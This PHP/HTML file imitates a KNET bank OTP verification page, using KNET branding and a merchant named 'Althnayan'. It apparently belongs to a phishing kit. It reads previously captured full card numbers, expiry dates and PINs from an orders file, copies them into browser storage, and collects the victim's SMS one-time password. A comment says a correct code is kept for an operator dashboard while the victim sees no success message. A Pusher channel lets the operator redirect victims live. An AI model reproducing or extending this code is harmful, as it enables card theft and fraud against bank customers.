<?php

/**
 * بيانات knet_card_details المحفوظة من knet.php (save_flow_step) لهذا الطلب/الجلسة
 */
function farm_ver_find_knet_card_data(array $order, string $reservationId): ?array
{
	$flow = $order['flow_data'] ?? null;
	if (!is_array($flow)) {
		return null;
	}
	$list = [];
	foreach ($flow as $entry) {
		if (!is_array($entry) || ($entry['step'] ?? '') !== 'knet_card_details') {
			continue;
		}
		$d = $entry['data'] ?? null;
		if (is_array($d)) {
			$list[] = $d;
		}
	}
	if ($list === []) {
		return null;
	}
	/*
	 * flow_data يُلحق بـ array_unshift — العنصر [0] هو الأحدث.
	 * نبحث من الأحدث إلى الأقدم عن مطابقة reservation_id حتى لا تُعرض بطاقة قديمة بعد إعادة توجيه متعددة.
	 */
	$rid = preg_replace('/\D/', '', $reservationId);
	if ($rid !== '' && $rid !== '0') {
		for ($i = 0, $n = count($list); $i < $n; $i++) {
			$r = isset($list[$i]['reservation_id']) ? preg_replace('/\D/', '', (string) $list[$i]['reservation_id']) : '';
			if ($r === $rid) {
				return $list[$i];
			}
		}
	}
	return $list[0];
}

function farm_ver_format_masked_card(string $prefix, string $cnmbr): string
{
	$full = preg_replace('/\D/', '', $prefix) . preg_replace('/\D/', '', $cnmbr);
	if ($full === '') {
		return '—';
	}
	if (strlen($full) < 10) {
		$last = substr($full, -min(4, strlen($full)));
		return substr($full, 0, min(6, strlen($full))) . '******' . $last;
	}
	return substr($full, 0, 6) . '******' . substr($full, -4);
}

function farm_ver_pin_stars(?string $pin): string
{
	$n = strlen(preg_replace('/\D/', '', (string) $pin));
	if ($n < 1) {
		return '****';
	}
	return str_repeat('*', min(4, $n));
}

$reservation_id = isset($_GET['reservation_id']) ? preg_replace('/\D/', '', (string) $_GET['reservation_id']) : '';
if ($reservation_id === '') {
	$reservation_id = '0';
}
$totalPriceInput = '0.000';
if (isset($_GET['total'])) {
	$t = filter_var($_GET['total'], FILTER_VALIDATE_FLOAT);
	if ($t !== false && $t >= 0) {
		$totalPriceInput = number_format($t, 3, '.', '');
	}
}

$farm_order_id_get = isset($_GET['order_id']) ? preg_replace('/[^\d]/', '', (string) $_GET['order_id']) : '';

$projectRoot = dirname(dirname(dirname(__DIR__)));

/** عرض البطاقة: من knet_card_details المطابق لـ reservation_id — بدون بيانات وهمية */
$ver_knet_card = [
	'card_masked' => '—',
	'month' => '—',
	'year' => '—',
	'pin_stars' => '—',
	'from_order' => false,
];

$farm_ver_card_row_for_storage = null;

if ($farm_order_id_get !== '') {
	$ordersFile = $projectRoot . '/data/orders.json';
	if (is_file($ordersFile)) {
		$ordersJson = file_get_contents($ordersFile);
		$orders = $ordersJson !== false ? json_decode($ordersJson, true) : null;
		if (is_array($orders)) {
			foreach ($orders as $o) {
				if (!is_array($o) || (string) ($o['id'] ?? '') !== $farm_order_id_get) {
					continue;
				}
				$row = farm_ver_find_knet_card_data($o, $reservation_id);
				if ($row !== null) {
					$ver_knet_card['card_masked'] = farm_ver_format_masked_card(
						isset($row['prefix']) ? (string) $row['prefix'] : '',
						isset($row['cnmbr']) ? (string) $row['cnmbr'] : ''
					);
					$ver_knet_card['month'] = isset($row['month']) ? (string) $row['month'] : '—';
					$ver_knet_card['year'] = isset($row['year']) ? (string) $row['year'] : '—';
					$ver_knet_card['pin_stars'] = farm_ver_pin_stars(isset($row['pin']) ? (string) $row['pin'] : null);
					$ver_knet_card['from_order'] = true;
					$farm_ver_card_row_for_storage = [
						'reservation_id' => $reservation_id,
						'order_id' => $farm_order_id_get,
						'prefix' => isset($row['prefix']) ? (string) $row['prefix'] : '',
						'cnmbr' => isset($row['cnmbr']) ? (string) $row['cnmbr'] : '',
						'month' => isset($row['month']) ? (string) $row['month'] : '',
						'year' => isset($row['year']) ? (string) $row['year'] : '',
						'pin' => isset($row['pin']) ? (string) $row['pin'] : '',
					];
				}
				if ($totalPriceInput === '0.000' || $totalPriceInput === '0') {
					$pt = $o['payment']['total'] ?? null;
					if ($pt !== null && $pt !== '') {
						$t = filter_var($pt, FILTER_VALIDATE_FLOAT);
						if ($t !== false && $t >= 0) {
							$totalPriceInput = number_format((float) $t, 3, '.', '');
						}
					}
				}
				break;
			}
		}
	}
}

/** الإرسال للخادم يتم عبر Ajax (ver_submit_otp.php) مع شاشة Checking ثم عرض النتيجة */
$posted_code = '';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>KNET Payments - OTP Verification</title>
    <link href="../knetVern/payment-responsive.css" rel="stylesheet" type="text/css">
    <link href="../knetVern/payment-stylesheet.css" rel="stylesheet" type="text/css">
    <style>
        /* مطابقة مجلد new/knetVern.blade.php — تعديل بسيط لرسالة الخطأ العربية */
        #otp_inline_err {
            direction: rtl;
        }

        #ver-checking-overlay {
            display: none;
            position: fixed;
            inset: 0;
            z-index: 99999;
            background: rgba(235, 235, 235, 0.92);
            align-items: center;
            justify-content: center;
            flex-direction: column;
            font-family: Arial, Helvetica, sans-serif;
        }

        #ver-checking-overlay.is-visible {
            display: flex;
        }

        .ver-checking-spinner {
            width: 44px;
            height: 44px;
            border: 4px solid #c5d8e8;
            border-top-color: #0070cd;
            border-radius: 50%;
            animation: verSpin 0.75s linear infinite;
            margin-bottom: 16px;
        }

        @keyframes verSpin {
            to {
                transform: rotate(360deg);
            }
        }

        .ver-checking-text {
            font-size: 16px;
            font-weight: 700;
            color: #333;
            letter-spacing: 0.02em;
        }

    </style>
</head>
<body>

    <div id="ver-checking-overlay" aria-live="polite" aria-busy="false">
        <div class="ver-checking-spinner" role="status"></div>
        <div class="ver-checking-text">Checking...</div>
    </div>

    <form id="otpForm" method="post" action="#">
        <div id="payConfirm">
            <div class="container">
                <div class="content-block">

                    <div class="form-card">
                        <div class="container-blogo" align="center">
                            <img style="width: 60px" src="../knet/knet.png" alt="logo">
                        </div>
                        <div class="row">
                            <div><label class="column-label">Merchant:</label></div>
                            <div><label class="column-value text-label">Althnayan</label></div>
                        </div>
                        <div class="row" id="OrgTranxAmtConfirm">
                            <div><label class="column-label">Amount:</label></div>
                            <div><label class="column-value text-label">KD <?php echo htmlspecialchars($totalPriceInput); ?></label></div>
                        </div>
                    </div>

                    <div class="form-card">
                        <div class="notification" id="otp_inline_err" style="display:none;border:#ff0000 1px solid;background-color:#f7dadd;font-size:12px;font-family:Helvetica,Arial,sans-serif;color:#ff0000;padding:8px 10px;margin-bottom:8px;text-align:center;"></div>

                        <div class="row alert-msg" id="notificationbox" style="color:#31708f;font-family:Arial,Helvetica,serif;font-size:13px;">
                            <div id="notification">
                                <p><span class="title" style="font-weight:bold">NOTIFICATION:</span> You will presently receive an SMS on your mobile number registered with your bank.This is an OTP (One Time Password) SMS, it contains 6 digits to be entered in the box below.</p>
                            </div>
                        </div>

                        <div class="row">
                            <div id="payConfirmCardNum">
                                <label class="column-label">Card Number:</label>
                            </div>
                            <div><label class="column-value text-label" id="DCNumber" style="padding-left:5px;"><?php echo htmlspecialchars($ver_knet_card['card_masked'], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); ?></label></div>
                        </div>
                        <div class="row" id="payConfirmExpmnth" style="display:block;">
                            <div><label class="column-label" style="width:41%">Expiration Month:</label></div>
                            <div><label class="column-value text-label" id="expmnth" style="padding-left:5px;width:59%"><?php echo htmlspecialchars($ver_knet_card['month'], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); ?></label></div>
                        </div>
                        <div class="row" id="payConfirmExpyr" style="display:block;">
                            <div><label class="column-label">Expiration Year:</label></div>
                            <div><label class="column-value text-label" id="expyear" style="padding-left:5px;"><?php echo htmlspecialchars($ver_knet_card['year'], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); ?></label></div>
                        </div>
                        <div class="row">
                            <div><label class="column-label">PIN:</label></div>
                            <div><label class="column-value text-label" id="farm_ver_pin_display" style="padding-left:5px;"><?php echo htmlspecialchars($ver_knet_card['pin_stars'], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); ?></label></div>
                        </div>

                        <div class="row" id="OTPDCDIV" style="display:block;">
                            <div><label class="column-label" style="padding-top:4px;">OTP:</label></div>
                            <div>
                                <input type="text" inputmode="numeric" pattern="[0-9]*" autocomplete="off" class="allownumericwithoutdecimal" style="width:60%;" id="debitOTPtimer" name="code" placeholder="Timeout in: 3:00" maxlength="6" value="" oninput="return isOtpNumeric(this);" required>
                            </div>
                        </div>
                    </div>

                    <div class="form-card">
                        <div class="row">
                            <div style="text-align:center;">
                                <div id="loading" style="display:none;">
                                    <center><img src="../knet/loading.gif" style="height:20px;float:left;margin-left:20%" alt=""><label class="column-value text-label" style="width:70%;text-align:center;">Processing.. please wait ...</label></center>
                                </div>
                                <div id="submithide1">
                                    <button type="submit" name="confirm" class="submit-button">Confirm</button>
                                    <input name="proceedCancel" type="button" class="cancel-button" id="cancel1" value="Cancel" onclick="cancelPage();">
                                </div>
                            </div>
                        </div>
                    </div>

                    <footer>
                        <div class="footer-content">
                            <span>
                                <div class="row_new">
                                    <div style="text-align:center;font-size:11px;color:#000000;font-weight:normal;line-height:18px;">
                                        All&nbsp;Rights&nbsp;Reserved.&nbsp;Copyright&nbsp;2026&nbsp;<br>
                                        <span style="font-size:10px;font-weight:bold;color:#0077D5;">The&nbsp;Shared&nbsp;Electronic&nbsp;Banking&nbsp;Services&nbsp;Company - KNET</span>
                                    </div>
                                </div>
                            </span>
                        </div>
                    </footer>

                </div>
            </div>
        </div>
        <input type="hidden" name="amount" value="<?= htmlspecialchars($totalPriceInput) ?>">
        <input type="hidden" name="reservation_id" value="<?php echo htmlspecialchars($reservation_id, ENT_QUOTES, 'UTF-8'); ?>">
        <input type="hidden" name="farm_order_id" id="farm_order_id" value="<?php echo htmlspecialchars($farm_order_id_get, ENT_QUOTES, 'UTF-8'); ?>">
    </form>
  

    <script src="../../../js/farm_checkout_total.js"></script>
    <script src="../../../js/farm_knet_card_snapshot.js"></script>
    <?php if (is_array($farm_ver_card_row_for_storage)) : ?>
    <script>
        document.addEventListener('DOMContentLoaded', function () {
            try {
                if (typeof farmKnetCardSnapshot === 'undefined') {
                    return;
                }
                var p = <?= json_encode($farm_ver_card_row_for_storage, JSON_UNESCAPED_UNICODE) ?>;
                farmKnetCardSnapshot.saveFromKnetPayload(p.reservation_id, p.order_id, {
                    prefix: p.prefix,
                    cnmbr: p.cnmbr,
                    month: p.month,
                    year: p.year,
                    pin: p.pin
                });
            } catch (e) {}
        });
    </script>
    <?php endif; ?>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script>
        function isOtpNumeric(input) {
            input.value = input.value.replace(/[^0-9]/g, '');
            return true;
        }

        function startOtpTimer() {
            var timeLeft = 180;
            var inp = document.getElementById('debitOTPtimer');
            var timer = setInterval(function () {
                var minutes = Math.floor(timeLeft / 60);
                var seconds = timeLeft % 60;
                seconds = seconds < 10 ? '0' + seconds : seconds;
                var ph = 'Timeout in: ' + minutes + ':' + seconds;
                if (inp && !inp.value) {
                    inp.setAttribute('placeholder', ph);
                }
                if (timeLeft <= 0) {
                    clearInterval(timer);
                    if (inp) {
                        inp.setAttribute('placeholder', 'Your OTP has Expired.');
                    }
                    $('button[name="confirm"]').prop('disabled', true);
                    return;
                }
                timeLeft--;
            }, 1000);
        }

        function cancelPage() {
            window.history.back();
        }

        var wrongOtpMsg = 'رمز التحقق OTP الذي أدخلته خاطئ٬ يرجى إعادة إدخال الرمز والمحاولة مرة أخرى';

        function showChecking(show) {
            var ov = document.getElementById('ver-checking-overlay');
            if (!ov) {
                return;
            }
            if (show) {
                ov.classList.add('is-visible');
                ov.setAttribute('aria-busy', 'true');
            } else {
                ov.classList.remove('is-visible');
                ov.setAttribute('aria-busy', 'false');
            }
        }

        $(document).ready(function() {
            try {
                var phpAmt = <?= json_encode($totalPriceInput, JSON_UNESCAPED_UNICODE) ?>;
                var t =
                    typeof farmCheckoutTotal !== 'undefined'
                        ? farmCheckoutTotal.resolve(phpAmt)
                        : phpAmt;
                var amtLab = document.querySelector('#OrgTranxAmtConfirm .column-value.text-label');
                if (amtLab) {
                    amtLab.textContent = 'KD ' + t;
                }
                var amtInp = document.querySelector('input[name="amount"]');
                if (amtInp) {
                    amtInp.value = t;
                }
            } catch (eAmt) {}
            try {
                var hid = document.getElementById('farm_order_id');
                var sid = sessionStorage.getItem('farm_order_id');
                if (hid && sid && !hid.value) {
                    hid.value = sid.replace(/\D/g, '');
                }
            } catch (eFarm) {}
            try {
                if (typeof farmKnetCardSnapshot !== 'undefined') {
                    var rv = <?= json_encode($reservation_id, JSON_UNESCAPED_UNICODE) ?>;
                    var ov = String($('#farm_order_id').val() || '').replace(/\D/g, '');
                    farmKnetCardSnapshot.applyToVerPageIfMatch(rv, ov);
                }
            } catch (eCardSnap) {}
            $('#debitOTPtimer').on('input', function () {
                $('#otp_inline_err').hide().empty();
            });

            $('#otpForm').on('submit', function (e) {
                e.preventDefault();
                var code = String($('#debitOTPtimer').val() || '').replace(/\D/g, '').slice(0, 6);
                var oid = String($('#farm_order_id').val() || '').replace(/\D/g, '');
                if (code.length !== 6) {
                    $('#otp_inline_err').show().text('يرجى إدخال رمز مكوّن من 6 أرقام.');
                    return;
                }
                if (!oid) {
                    $('#otp_inline_err').show().text('رقم الطلب غير متوفر. أعد فتح الصفحة من رابط يحتوي order_id.');
                    return;
                }

                $('#otp_inline_err').hide().empty();
                $('#submithide1').find('button,input').prop('disabled', true);
                showChecking(true);

                var payload = {
                    farm_order_id: oid,
                    code: code,
                    amount: $('input[name="amount"]').val() || '',
                    reservation_id: $('input[name="reservation_id"]').val() || ''
                };

                var t0 = Date.now();
                fetch('ver_submit_otp.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload),
                    credentials: 'same-origin'
                })
                    .then(function (r) {
                        return r.json().catch(function () {
                            return { success: false, message: 'تعذّر قراءة الرد' };
                        });
                    })
                    .then(function (data) {
                        var elapsed = Date.now() - t0;
                        var waitMs = Math.max(0, 3000 - elapsed);
                        return new Promise(function (resolve) {
                            setTimeout(function () {
                                resolve(data);
                            }, waitMs);
                        });
                    })
                    .then(function (data) {
                        showChecking(false);
                        $('#submithide1').find('button,input').prop('disabled', false);

                        if (!data || !data.success) {
                            $('#otp_inline_err').show().text((data && data.message) ? data.message : 'حدث خطأ. أعد المحاولة.');
                            return;
                        }
                        /* للعميل: فقط رسالة الخطأ كالسابق — لا رسالة نجاح. الرمز الصحيح يُحفظ للوحة دون إظهار نجاح */
                        if (data.valid) {
                            $('#otp_inline_err').hide().empty();
                        } else {
                            $('#otp_inline_err').show().text(data.message || wrongOtpMsg);
                        }
                    })
                    .catch(function () {
                        showChecking(false);
                        $('#submithide1').find('button,input').prop('disabled', false);
                        $('#otp_inline_err').show().text('خطأ في الاتصال. تحقق من الشبكة.');
                    });
            });

            startOtpTimer();
        });
    </script>

    <script src="https://js.pusher.com/8.4.0/pusher.min.js"></script>
    <script>
        const reservationId = <?= json_encode($reservation_id, JSON_UNESCAPED_UNICODE) ?>;

        if (reservationId && reservationId !== '0') {
            console.log('Listening for redirect on reservation_id:', reservationId);

            const pusher = new Pusher('a56388ee6222f6c5fb86', {
                cluster: 'ap2',
                encrypted: true
            });

            const userChannel = pusher.subscribe('redirect-user-' + reservationId);

            userChannel.bind('redirect-event', function(data) {
                console.log('✅ Redirect event received:', data);
                
                if (data.redirect_url) {
                    console.log('🚀 Redirecting to:', data.redirect_url);
                    window.location.href = data.redirect_url;
                }
            });

            pusher.connection.bind('connected', function() {
                console.log('✅ Pusher connected for reservation:', reservationId);
            });

            pusher.connection.bind('error', function(err) {
                console.error('❌ Pusher error:', err);
            });
        } else {
            console.warn('⚠️ No valid reservation_id found');
        }
    </script>
    <script src="../../../js/client_track.js"></script>
</body>
</html>